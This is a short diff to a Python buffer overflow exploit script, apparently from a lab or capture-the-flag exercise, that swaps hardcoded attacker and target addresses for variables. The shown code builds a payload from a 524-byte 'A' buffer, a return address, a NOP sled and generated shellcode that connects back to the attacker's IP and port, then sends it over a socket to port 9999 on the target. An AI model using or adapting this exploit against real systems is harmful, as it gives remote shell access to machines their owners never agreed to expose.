@@ -32,7 +32,7 @@ def generate_shellcode(ip, port):
     return buf
 
 print('\n[+] Genereting shellcode...\n')
-venom = generate_shellcode('10.18.22.182', '9001')
+venom = generate_shellcode(ip, port)
 padding = b'\x90' * 32
 buffer = b'A' * 524
 opcode = b'\xf3\x12\x17\x31'
@@ -42,7 +42,7 @@ shellcode = buffer + opcode + padding + venom
 print('\n[+] connecting to target...')
 try:
     conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    conn.connect(('10.10.54.56', 9999))
+    conn.connect((target, 9999))
     conn.sendall(shellcode)
     conn.close()
 
